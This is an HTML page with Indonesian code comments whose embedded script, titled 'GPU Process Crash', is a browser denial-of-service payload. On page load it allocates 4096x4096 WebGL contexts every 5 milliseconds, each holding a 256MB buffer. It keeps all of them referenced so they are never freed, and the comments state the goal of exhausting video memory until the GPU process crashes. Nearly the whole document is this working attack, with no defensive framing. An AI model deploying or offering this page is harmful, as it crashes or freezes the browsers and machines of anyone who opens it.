<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>GPU Process Crash</title>
<style>
  body { background: #000; color: #f00; overflow: hidden; font-family: monospace; text-align: center; padding-top: 20vh; }
  canvas { display: none; }
</style>
</head>
<body>
<h1>🔥 EXHAUSTING GPU PROCESS 🔥</h1>
<p id="status">Mengalokasikan VRAM...</p>

<script>
(function () {
  'use strict';

  var statusEl = document.getElementById('status');
  var contextCount = 0;
  var contexts = [];

  // ============================================
  // FUNGSI PENGHANCUR GPU
  // ============================================
  function floodGPU() {
    try {
      // 1. Buat elemen canvas baru (tidak dimasukkan ke DOM agar ringan di CPU, tapi berat di GPU)
      var canvas = document.createElement('canvas');
      canvas.width = 4096;  // Resolusi tinggi memakan VRAM besar
      canvas.height = 4096;

      // 2. Pilih API (WebGL 2.0 atau WebGL 1.0)
      var gl = canvas.getContext('webgl2') || 
               canvas.getContext('webgl') || 
               canvas.getContext('experimental-webgl');

      if (!gl) return; // Jika diblokir, lewati

      // 3. Alokasi Buffer Besar di VRAM
      var buffer = gl.createBuffer();
      gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
      // Alokasi 256MB VRAM per context
      gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(64 * 1024 * 1024), gl.STATIC_DRAW);

      // 4. Paksa GPU untuk merender (Shader Compilation & Draw Call)
      // Ini memaksa proses GPU bekerja sangat keras
      var vsSource = `attribute vec4 aVertexPosition; void main() { gl_Position = aVertexPosition; }`;
      var fsSource = `void main() { gl_FragColor = vec4(1.0, 0.0, 0.0, 1.0); }`;
      
      var shader = gl.createShader(gl.VERTEX_SHADER);
      gl.shaderSource(shader, vsSource);
      gl.compileShader(shader);
      
      var program = gl.createProgram();
      gl.attachShader(program, shader);
      gl.linkProgram(program);
      gl.useProgram(program);
      gl.drawArrays(gl.TRIANGLES, 0, 3);

      // Simpan context agar tidak di-Garbage Collect
      contexts.push(gl);
      contextCount++;

      statusEl.innerText = "WebGL Contexts Allocated: " + contextCount;

      // Setiap 200 context, log ke console
      if (contextCount % 200 === 0) {
        console.log("[!] GPU Contexts: " + contextCount);
      }

    } catch (e) {
      console.log("GPU Error (Expected when VRAM full):", e.message);
    }

    // 5. Loop super cepat (setiap 5ms)
    // Browser biasanya membatasi WebGL context (max ~16-32 per halaman).
    // Jika batas ini bisa ditembus, proses GPU akan langsung crash.
    setTimeout(floodGPU, 5); 
  }

  // ============================================
  // EKSEKUSI
  // ============================================
  setTimeout(floodGPU, 500);

})();
</script>
</body>
</html>
